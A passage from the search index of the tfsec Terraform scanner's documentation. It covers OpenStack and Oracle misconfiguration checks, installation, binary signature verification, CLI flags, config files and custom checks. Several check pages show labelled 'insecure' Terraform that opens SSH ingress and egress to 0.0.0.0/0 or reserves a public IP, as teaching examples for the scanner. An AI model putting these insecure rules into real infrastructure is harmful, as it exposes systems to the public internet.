Impact"},{"location":"checks/openstack/networking/no-public-egress/#suggested-resolution","text":"<p>Employ more restrictive security group rules</p>","title":"Suggested Resolution"},{"location":"checks/openstack/networking/no-public-egress/#insecure-example","text":"<p>The following example will fail the openstack-networking-no-public-egress check. <pre><code> resource \"openstack_networking_secgroup_rule_v2\" \"rule_1\" {\n    direction         = \"egress\"\n    ethertype         = \"IPv4\"\n    protocol          = \"tcp\"\n    port_range_min    = 22\n    port_range_max    = 22\n    remote_ip_prefix  = \"0.0.0.0/0\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/openstack/networking/no-public-egress/#secure-example","text":"<p>The following example will pass the openstack-networking-no-public-egress check. <pre><code>resource \"openstack_networking_secgroup_rule_v2\" \"rule_1\" {\n    direction         = \"egress\"\n    ethertype         = \"IPv4\"\n    protocol          = \"tcp\"\n    port_range_min    = 22\n    port_range_max    = 22\n    remote_ip_prefix  = \"1.2.3.4/32\"\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/openstack/networking/no-public-egress/#links","text":"<ul> <li>https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/networking_secgroup_rule_v2</li> </ul>","title":"Links"},{"location":"checks/openstack/networking/no-public-ingress/","text":"","title":"A security group rule allows ingress traffic from multiple public addresses"},{"location":"checks/openstack/networking/no-public-ingress/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/openstack/networking/no-public-ingress/#explanation","text":"<p>Opening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.</p>","title":"Explanation"},{"location":"checks/openstack/networking/no-public-ingress/#possible-impact","text":"<p>Exposure of infrastructure to the public internet</p>","title":"Possible Impact"},{"location":"checks/openstack/networking/no-public-ingress/#suggested-resolution","text":"<p>Employ more restrictive security group rules</p>","title":"Suggested Resolution"},{"location":"checks/openstack/networking/no-public-ingress/#insecure-example","text":"<p>The following example will fail the openstack-networking-no-public-ingress check. <pre><code> resource \"openstack_networking_secgroup_rule_v2\" \"rule_1\" {\n    direction         = \"ingress\"\n    ethertype         = \"IPv4\"\n    protocol          = \"tcp\"\n    port_range_min    = 22\n    port_range_max    = 22\n    remote_ip_prefix  = \"0.0.0.0/0\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/openstack/networking/no-public-ingress/#secure-example","text":"<p>The following example will pass the openstack-networking-no-public-ingress check. <pre><code> resource \"openstack_networking_secgroup_rule_v2\" \"rule_1\" {\n    direction         = \"ingress\"\n    ethertype         = \"IPv4\"\n    protocol          = \"tcp\"\n    port_range_min    = 22\n    port_range_max    = 22\n    remote_ip_prefix  = \"1.2.3.4/32\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/openstack/networking/no-public-ingress/#links","text":"<ul> <li>https://registry.terraform.io/providers/terraform-provider-openstack/openstack/latest/docs/resources/fw_rule_v1</li> </ul>","title":"Links"},{"location":"checks/oracle/","text":"","title":"oracle"},{"location":"checks/oracle/#services","text":"<ul> <li>compute</li> </ul>","title":"Services"},{"location":"checks/oracle/compute/","text":"","title":"compute"},{"location":"checks/oracle/compute/#checks","text":"<ul> <li>no-public-ip Compute instance requests an IP reservation from a public pool</li> </ul>","title":"Checks"},{"location":"checks/oracle/compute/no-public-ip/","text":"","title":"Compute instance requests an IP reservation from a public pool"},{"location":"checks/oracle/compute/no-public-ip/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/oracle/compute/no-public-ip/#explanation","text":"<p>Compute instance requests an IP reservation from a public pool</p> <p>The compute instance has the ability to be reached from outside, you might want to sonder the use of a non public IP.</p>","title":"Explanation"},{"location":"checks/oracle/compute/no-public-ip/#possible-impact","text":"<p>The compute instance has the ability to be reached from outside</p>","title":"Possible Impact"},{"location":"checks/oracle/compute/no-public-ip/#suggested-resolution","text":"<p>Reconsider the use of an public IP</p>","title":"Suggested Resolution"},{"location":"checks/oracle/compute/no-public-ip/#insecure-example","text":"<p>The following example will fail the oracle-compute-no-public-ip check. <pre><code> resource \"opc_compute_ip_address_reservation\" \"bad_example\" {\n    name            = \"my-ip-address\"\n    ip_address_pool = \"public-ippool\"\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/oracle/compute/no-public-ip/#secure-example","text":"<p>The following example will pass the oracle-compute-no-public-ip check. <pre><code> resource \"opc_compute_ip_address_reservation\" \"good_example\" {\n    name            = \"my-ip-address\"\n    ip_address_pool = \"cloud-ippool\"\n   }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/oracle/compute/no-public-ip/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/opc/latest/docs/resources/opc_compute_ip_address_reservation</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/opc/latest/docs/resources/opc_compute_instance</p> </li> </ul>","title":"Links"},{"location":"guides/credit/","text":"<ul> <li>Liam Galvin (liamg)</li> <li>Owen Rumney (owenrumney)</li> </ul>","title":"Authors"},{"location":"guides/credit/#contributors","text":"<p>Thanks to all contributors</p>","title":"Contributors"},{"location":"guides/installation/","tags":["installation","quickstart"],"text":"<p>Install with brew/linuxbrew</p> <pre><code>brew install tfsec\n</code></pre> <p>Install with Chocolatey</p> <pre><code>choco install tfsec\n</code></pre> <p>Install with Scoop</p> <p><pre><code>scoop install tfsec\n</code></pre> You can also grab the binary for your system from the releases page.</p> <p>Alternatively, install with Go:</p> <pre><code>go install github.com/aquasecurity/tfsec/cmd/tfsec@latest\n</code></pre>","title":"Installation"},{"location":"guides/quickstart/","text":"","title":"Quick Start"},{"location":"guides/quickstart/#using-as-a-command-line-tool","text":"<p>The easiest way to run <code>tfsec</code> is to run it in the directory you want to scan.</p> <pre><code>tfsec\n</code></pre> <p><code>tfsec</code> will traverse the directory till it finds a valid Terraform file; the directory it finds this file in will be considered to the working directory.</p> <p>If you want to run on a specific location, this can be passed as an argument;</p> <pre><code>tfsec ./tf/prod\n</code></pre> <p>The exit status will be non-zero if tfsec finds problems, otherwise the exit status will be zero.</p>","title":"Using as a command line tool"},{"location":"guides/quickstart/#use-with-docker","text":"<p>As an alternative to installing and running tfsec on your system, you may run tfsec in a Docker container.</p> <p>To run:</p> <pre><code>docker run --rm -it -v \"$(pwd):/src\" aquasec/tfsec /src\n</code></pre>","title":"Use with Docker"},{"location":"guides/quickstart/#using-in-ci","text":"<p><code>tfsec</code> can be added to any CI pipeline as a command with the exit code dictating if it breaks the build. </p> <p>We do provide a GitHub Action that will also upload the results to GitHub code scanning UI.</p>","title":"Using in CI"},{"location":"guides/quickstart/#passing-arguments","text":"<p>This page only covers the basics of what <code>tfsec</code> can do - much more is achievable using the arguments on the Parameters page.</p>","title":"Passing Arguments"},{"location":"guides/signing/","text":"","title":"Signature Verification"},{"location":"guides/signing/#verifying-signed-binaries","text":"<p>All tfsec binaries are signed with out signing key <code>D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE</code>. The steps below detail how to verify the signature of the keys.</p>","title":"Verifying signed binaries"},{"location":"guides/signing/#public-key","text":"<p>The public key for <code>signing@tfsec.dev</code> can be downloaded here</p> <pre><code>-----BEGIN PGP PUBLIC KEY BLOCK-----\n\n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\nnX5QmAEwF/nBYV3Du7TIvHtz91yL8A==\n=opqY\n-----END PGP PUBLIC KEY BLOCK-----\n</code></pre>","title":"Public Key"},{"location":"guides/signing/#steps-for-verification","text":"<ol> <li> <p>Copy the public key block into a new file, eg; /tmp/tfsec_key.txt</p> </li> <li> <p>Import the gpg key    <pre><code> gpg --import &lt; /tmp/tfsec_key.txt\n</code></pre></p> </li> <li>Verify that the key has been imported     <pre><code>gpg --list-keys signing@tfsec.dev\n</code></pre>     check the output is     <pre><code>pub  rsa4096 2021-05-20 [SC]       D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE\nuid  [ultimate] Tfsec Signing (Code signing for tfsec) &lt;signing@tfsec.dev&gt;\nsub  rsa4096 2021-05-20 [E]\n</code></pre></li> <li> <p>Download the required binary and its associated sig file</p> </li> <li> <p>Assuming it is <code>tfsec-linux-amd64</code> the verify command below should be run, passing in the sig file then the binary file    <pre><code>gpg --verify tfsec-linux-amd64.D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE.sig tfsec-linux-amd64\n</code></pre>    This should give you a similar output to that below - the key part is that it is signed and has a <code>Good signature</code> <pre><code>gpg: Signature made Fri 09 Jul 2021 11:41:22 BST\ngpg:                using RSA key D66B222A3EA4C25D5D1A097FC34ACEFB46EC39CE\ngpg: Good signature from \"Tfsec Signing (Code signing for tfsec) &lt;signing@tfsec.dev&gt;\" [ultimate]\n</code></pre></p> </li> </ol>","title":"Steps for Verification"},{"location":"guides/trivy/","text":"<p>Overtime we've taken trivy to be the go-to scanning tool for a vareity of things. This also includes terraform scanning.</p> <p>This section describes some differences between Trivy and tfsec.</p>    Feature Trivy tfsec     Policy Distribution Embedded and Updated via Registry Embedded   Custom Policies Rego Rego, JSON, and YAML   Supported Formats Dockerfile, JSON, YAML, Terraform, CloudFormation etc. Terraform  Only","title":"Moving towards configuration scanning with Trivy"},{"location":"guides/trivy/#comparison-with-examples","text":"","title":"Comparison with examples"},{"location":"guides/trivy/#simple-scan","text":"","title":"Simple scan"},{"location":"guides/trivy/#with-trivy","text":"<pre><code>$ trivy config &lt;dir&gt;\n</code></pre>","title":"With Trivy"},{"location":"guides/trivy/#with-tfsec","text":"<pre><code>$ tfsec &lt;dir&gt;\n</code></pre>","title":"With tfsec"},{"location":"guides/trivy/#passing-tfvars","text":"","title":"Passing tfvars"},{"location":"guides/trivy/#with-trivy_1","text":"<pre><code>$ trivy --tf-vars &lt;vars.tf&gt; &lt;dir&gt;\n</code></pre>","title":"With Trivy"},{"location":"guides/trivy/#with-tfsec_1","text":"<pre><code>$ tfsec &lt;dir&gt; --tf-vars-file &lt;vars.tf&gt;\n</code></pre>","title":"With tfsec"},{"location":"guides/trivy/#report-formats","text":"","title":"Report formats"},{"location":"guides/trivy/#with-trivy_2","text":"<pre><code>$ trivy config --format &lt;format-type&gt; &lt;dir&gt;\n</code></pre>","title":"With Trivy"},{"location":"guides/trivy/#with-tfsec_2","text":"<pre><code>$ tfsec &lt;dir&gt; --format &lt;format-type&gt;\n</code></pre> <p>We welcome any feedback if you find features that today are not available with Trivy misconfigration scanning that are available in tfsec. </p>","title":"With tfsec"},{"location":"guides/usage/","tags":["installation","quickstart"],"text":"<p>tfsec can be run with no arguments and will act on the current folder.</p> <p>For a richer experience, there are many additional command line arguments that you can make use of.</p>    Argument Short Code Description     <code>--code-theme string</code>  Theme for annotated code. Either 'light' or 'dark'. (default \"dark\")   <code>--concise-output</code>  Reduce the amount of output and no statistics   <code>--config-file string</code>  Config file to use during run   <code>--config-file-url string</code>  Config file to download from a remote location. Must be json or yaml   <code>--custom-check-dir string</code>  Explicitly the custom checks dir location   <code>--custom-check-url string</code>  Download a custom check file from a remote location. Must be json or yaml   <code>--debug</code>  Enable debug logging (same as verbose)   <code>--disable-grouping</code> <code>-G</code> Disable grouping of similar results   <code>--exclude string</code> <code>-e</code> Provide comma-separated list of rule IDs to exclude from run.   <code>--exclude-downloaded-modules</code>  Remove results for downloaded modules in .terraform folder   <code>--exclude-path strings</code>  Folder path to exclude, can be used multiple times and evaluated in order of specification   <code>--filter-results string</code>  Filter results to return specific checks only (supports comma-delimited input).   <code>--force-all-dirs</code>  Don't search for tf files, include everything below provided directory.   <code>--format string</code> <code>-f</code> Select output format: lovely, json, csv, checkstyle, junit, sarif, text, markdown, html, gif. To use multiple formats, separate with a comma and specify a base output filename with --out. A file will be written for each type. The first format will additionally be written stdout. (default \"lovely\")   <code>--help</code> <code>-h</code> help for tfsec   <code>--ignore-hcl-errors</code>  Do not report an error if an HCL parse error is encountered   <code>--include-ignored</code>  Include ignored checks in the result output   <code>--include-passed</code>  Include passed checks in the result output   <code>--migrate-ignores</code>  Migrate ignore codes to the new ID structure   <code>--minimum-severity string</code> <code>-m</code> The minimum severity to report. One of CRITICAL, HIGH, MEDIUM, LOW.   <code>--no-code</code>  Don't include the code snippets in the output.   <code>--no-color</code>  Disable colored output (American style!)   <code>--no-colour</code>  Disable coloured output   <code>--no-ignores</code>  Do not apply any ignore rules - normally ignored checks will fail   <code>--no-module-downloads</code>  Do not download remote modules.   <code>--out string</code> <code>-O</code> Set output file. This filename will have a format descriptor appended if multiple formats are specified with --format   <code>--print-rego-input</code>  Print a JSON representation of the input supplied to rego policies.   <code>--rego-only</code>  Run rego policies exclusively.   <code>--rego-policy-dir string</code>  Directory to load rego policies from (recursively).   <code>--run-statistics</code>  View statistics table of current findings.   <code>--single-thread</code>  Run checks using a single thread   <code>--soft-fail</code> <code>-s</code> Runs checks but suppresses error code   <code>--tfvars-file strings</code>  Path to .tfvars file, can be used multiple times and evaluated in order of specification   <code>--update</code>  Update to latest version   <code>--var-file strings</code>  Path to .tfvars file, can be used multiple times and evaluated in order of specification (same functionality as --tfvars-file but consistent with Terraform)   <code>--verbose</code>  Enable verbose logging (same as debug)   <code>--version</code> <code>-v</code> Show version information and exit   <code>--workspace string</code> <code>-w</code> Specify a workspace for ignore limits (default \"default\")    <p>This list can also be found by running <code>tfsec --help</code></p>","title":"Usage"},{"location":"guides/configuration/config/","tags":["configuration"],"text":"<p>The tfsec config file can override various tfsec configurations.</p> <p>The tfsec config file is a file in the <code>.tfsec</code> folder in the root check path named <code>config.json</code> or <code>config.yml</code> and is automatically loaded if it exists.</p> <p>The config file can also be set with the <code>--config-file</code> option:</p> <pre><code>tfsec --config-file tfsec.yml\n</code></pre> <p>Config files can be downloaded from remote locations using the <code>--config-file-url</code>. This must be a HTTP location to a file with either a <code>json</code> or <code>yaml</code> extension</p> <pre><code>tfsec --config-file-url https://github.com/myorg/tfsecconfig/config.json .\n</code></pre>","title":"Config File"},{"location":"guides/configuration/config/#minimum-severity","tags":["configuration"],"text":"<p>You can specify the minimum severity of result that should be reported. By default, every severity is reported. You must use one of CRITICAL, HIGH, MEDIUM, LOW.</p> <pre><code>{\n  \"minimum_severity\": \"MEDIUM\"\n}\n</code></pre> <p>or in yaml</p> <pre><code>---\nminimum_severity: MEDIUM\n</code></pre>","title":"Minimum Severity"},{"location":"guides/configuration/config/#syntax-and-overrides","tags":["configuration"],"text":"","title":"Syntax and Overrides"},{"location":"guides/configuration/config/#severity-overrides","tags":["configuration"],"text":"<p>There are occasions where the default severity level for one of the built in checks is too severe or in some cases not strong enough.</p> <p>The config file can be used to specify overrides for any check identifier to replace the result output.</p> <pre><code>{\n  \"severity_overrides\": {\n    \"CUS002\": \"ERROR\",\n    \"aws-s3-enable-versioning\": \"LOW\"\n  }\n}\n</code></pre> <p>or in yaml</p> <pre><code>---\nseverity_overrides:\n  CUS002: ERROR\n  aws-s3-enable-versioning: HIGH\n</code></pre>","title":"Severity Overrides"},{"location":"guides/configuration/config/#including-checks","tags":["configuration"],"text":"<p>In some situations you may want to only scan for a subset of the checks - this may be the case if newly added checks need to be evaluated before adding to the CI. We have removed the option to pass the included checks on the command line but they can be added in the config file.</p> <pre><code>{\n  \"include\": [\"CUS002\", \"aws-s3-enable-versioning\"]\n}\n</code></pre> <p>or in yaml</p> <pre><code>---\ninclude:\n  - CUS002\n  - aws-s3-enable-versioning\n</code></pre>","title":"Including checks"},{"location":"guides/configuration/config/#excluding-checks","tags":["configuration"],"text":"<p>There are moments where the list of checks you'd want to exclude becomes larger and larger. Rather than passing all the excluded checks via the command line, you can use the configuration entry <code>exclude</code> to list them all out.</p> <pre><code>{\n  \"exclude\": [\"CUS002\", \"aws-s3-enable-versioning\"]\n}\n</code></pre> <p>or in yaml</p> <pre><code>---\nexclude:\n  - CUS002\n  - aws-s3-enable-versioning\n</code></pre> <p>Excludes can include an expiry date, after which the check will be re-enabled.</p> <pre><code>{\n  \"exclude\": [\"CUS002:2022-12-31\", \"aws-s3-enable-versioning\"]\n}\n</code></pre> <p>or in yaml</p> <pre><code>---\nexclude:\n  - CUS002:2022-12-31\n  - aws-s3-enable-versioning\n</code></pre>","title":"Excluding checks"},{"location":"guides/configuration/config/#minimum-required-version","tags":["configuration"],"text":"<p>For your CI you might want to pull a config file into all of your build processes with a centrally managed config file. If this is the case, you might also want to require a minimum tfsec version to be used.</p> <p>This can be achieved in the config file using the <code>min_required_version</code> setting. </p> <pre><code>{\n  \"min_required_version\": \"v1.1.2\"\n}\n</code></pre> <p>or in yaml</p> <pre><code>---\nmin_required_version: v1.1.2\n</code></pre>","title":"Minimum required version"},{"location":"guides/configuration/custom-checks/","tags":["installation","github action","code scanning","security analysis"],"text":"","title":"Custom Checks"},{"location":"guides/configuration/custom-checks/#what-is-it","tags":["installation","github action","code scanning","security analysis"],"text":"<p>tfsec comes with an ever growing number of built in checks, these cover standard AWS, Azure and GCP provider checks, plus several more.</p> <p>We recognise that there are checks that need performing for an organisation that don't fit with general use cases; for this, there are custom checks.</p> <p>Custom checks offer an accessible approach to injecting checks that satisfy your organisations compliance and security needs. For example, if you require that all EC2 instances have a <code>CostCentre</code> tag, that can be achieved with a <code>custom_check</code>.</p>","title":"What is it?"},{"location":"guides/configuration/custom-checks/#how-does-it-work","tags":["installation","github action","code scanning","security analysis"],"text":"<p>Custom checks are defined as json files which sit in the <code>.tfsec</code> folder in the root check path. any file with the suffix <code>_tfchecks.json</code> or <code>_tfchecks.yaml</code> will be parsed and the checks included during the run.</p>","title":"How does it work?"},{"location":"guides/configuration/custom-checks/#overriding-check-directory","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The default location for custom checks can be overridden, this is done using the <code>--custom-check-dir</code> to specify another location to load the checks from instead. This is useful when global checks are to applied to the terraform under test.</p>","title":"Overriding check directory"},{"location":"guides/configuration/custom-checks/#downloading-remote-check-file","tags":["installation","github action","code scanning","security analysis"],"text":"<p>A custom check file can be downloaded from remote locations using the <code>--custom-check-url</code>. This must be an HTTP location to a file with either a <code>json</code> or <code>yaml</code> extension</p> <pre><code>tfsec --custom-check-url https://github.com/myorg/tfsecconfig/custom_tfchecks.json .\n</code></pre>","title":"Downloading remote check file"},{"location":"guides/configuration/custom-checks/#what-does-a-check-file-look-like","tags":["installation","github action","code scanning","security analysis"],"text":"<p>Check files are simply json, this ensures that checks can be put together without requiring Go knowledge or being able to build a new release of tfsec to include your custom code.</p> <p>Taking the previous example of a required cost centre, the check file might look something like</p> <pre><code>{\n  \"checks\": [\n    {\n      \"code\": \"CUS001\",\n      \"description\": \"Custom check to ensure the CostCentre tag is applied to EC2 instances\",\n      \"impact\": \"By not having CostCentre we can't keep track of billing\",\n      \"resolution\": \"Add the CostCentre tag\",\n      \"requiredTypes\": [\n        \"resource\"\n      ],\n      \"requiredLabels\": [\n        \"aws_instance\"\n      ],\n      \"severity\": \"ERROR\",\n      \"matchSpec\": {\n        \"name\": \"tags\",\n        \"action\": \"contains\",\n        \"value\": \"CostCentre\"\n      },\n      \"errorMessage\": \"The required CostCentre tag was missing\",\n      \"relatedLinks\": [\n        \"http://internal.acmecorp.com/standards/aws/tagging.html\"\n      ]\n    }\n  ]   \n}\n</code></pre> <p>or </p> <pre><code>---\nchecks:\n- code: CUS001\n  description: Custom check to ensure the CostCentre tag is applied to EC2 instances\n  impact: By not having CostCentre we can't keep track of billing\n  resolution: Add the CostCentre tag\n  requiredTypes:\n  - resource\n  requiredLabels:\n  - aws_instance\n  severity: ERROR\n  matchSpec:\n    name: tags\n    action: contains\n    value: CostCentre\n  errorMessage: The required CostCentre tag was missing\n  relatedLinks:\n  - http://internal.acmecorp.com/standards/aws/tagging.html\n</code></pre> <p>Using <code>go run ./cmd/tfsec-checkgen generate</code>, you can generate a skeleton custom check file.</p> <p>The check contains up of the following attributes;</p>    Attribute Description     code The custom code that your check will be known as   description A description for the code that will be included in the output   impact An optional detail about the consequences of not passing the check   resolution An optional brief description of how to satisfy the check   requiredTypes The block types to apply the check to - provider, resource, data, module, variable   requiredLabels The resource type - aws_ec2_instance for example. This also supports wildcards using <code>*</code>, e.g. <code>aws_*</code>   severity How severe is the check   matchSpec See below for the MatchSpec attributes   errorMessage The error message that should be displayed in cases where the check fails   relatedLinks A list of related links for the check to be displayed in cases where the check fails    <p>Optionally, you can use your own provider name and service</p>  <p>:warning: care should be taken not to mask existing checks. It is suggested that the provider shouldn't be one of the built in ones or should include the <code>custom</code> designator.</p>     Attribute Description     provider The name of the service the custom check is addressing   service The name of the service the custom check is addressing    <p>The <code>MatchSpec</code> is the what will define the check itself - this is fairly basic and is made up of the following attributes</p>    Attribute Description     name The name of the attribute or block to run the check on   action The check type - see below for more information   value In cases where a value is required, the value to look for, text matching <code>TFSEC_VAR_{VAR_NAME}</code> will be replaced with the variable value   ignoreUndefined If the attribute is undefined, ignore and pass the check   preConditions An array of checks, performs the check action defined in <code>action</code> if all preConditions checks passes, passes the whole <code>matchSpec</code> if preConditions are not satisfied   subMatch A sub MatchSpec block for nested checking - think looking for <code>enabled</code> value in a <code>logging</code> block, or checking a tag's value in a <code>tag</code> map attribute   subMatchOne Same as subMatch, but looks for only exactly 1 match in nested checks, cannot be applied on subMatches for attributes   predicateMatchSpec An array of MatchSpec blocks to be logically aggregated by either <code>and</code> or <code>or</code> actions   assignVariable The name of the \"variable\" to store the value of the <code>name</code> attribute in, has to be in uppercase and start with <code>TFSEC_VAR_</code>","title":"What does a check file look like?"},{"location":"guides/configuration/custom-checks/#check-actions","tags":["installation","github action","code scanning","security analysis"],"text":"<p>There are a number of <code>CheckActions</code> available which should allow you to quickly put together most checks.</p>","title":"Check Actions"},{"location":"guides/configuration/custom-checks/#inmodule","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>inModule</code> check action passes if the resource block is a component of a module. For example, if you're looking to check that an <code>aws_s3_bucket</code> is only created using a custom module, you could use the following <code>MatchSpec</code>;</p> <pre><code>\"matchSpec\" : {\n  \"action\": \"inModule\"\n}\n</code></pre> <pre><code>matchSpec:\n  action: inModule\n</code></pre>","title":"inModule"},{"location":"guides/configuration/custom-checks/#ispresent","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>isPresent</code> check action passes if the required block or attribute is available in the checked block. For example, if you're looking to check that an <code>acl</code> is provided and don't care what it is, you can use the following <code>MatchSpec</code>;</p> <pre><code>\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"isPresent\"\n}\n</code></pre> <pre><code>matchSpec:\n  name: acl\n  action: isPresent\n</code></pre>","title":"isPresent"},{"location":"guides/configuration/custom-checks/#notpresent","tags":["installation","github action","code scanning","security analysis"],"text":"<p>Conversely, the <code>noPresent</code> check action passes if the specified block or attribute is not found in the checked block. For example, if you explicitly don't want an <code>acl</code> attribute to be present hou can use the following <code>MatchSpec</code></p> <pre><code>\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"notPresent\"\n}\n</code></pre> <pre><code>matchSpec:\n  name: acl\n  action: notPresent\n</code></pre>","title":"notPresent"},{"location":"guides/configuration/custom-checks/#isempty","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>isEmpty</code> check action passes if the named block or attribute is defined by empty. For example, to check that there are not tags you might use the following <code>MatchSpec</code></p> <pre><code>\"matchSpec\" : {\n  \"name\": \"tags\",\n  \"action\": \"isEmpty\",\n}\n</code></pre> <pre><code>matchSpec:\n  name: acl\n  action: isEmpty\n</code></pre>","title":"isEmpty"},{"location":"guides/configuration/custom-checks/#startswith","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>startsWith</code> check action passes if the checked attribute string starts with the specified value. For example, to check that <code>acl</code> begins with <code>public</code> you could use the following <code>MatchSpec</code></p> <pre><code>\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"startsWith\",\n  \"value\": \"public\"\n}\n</code></pre> <pre><code>matchSpec:\n  name: acl\n  action: startsWith\n  value: public\n</code></pre>","title":"startsWith"},{"location":"guides/configuration/custom-checks/#endswith","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The 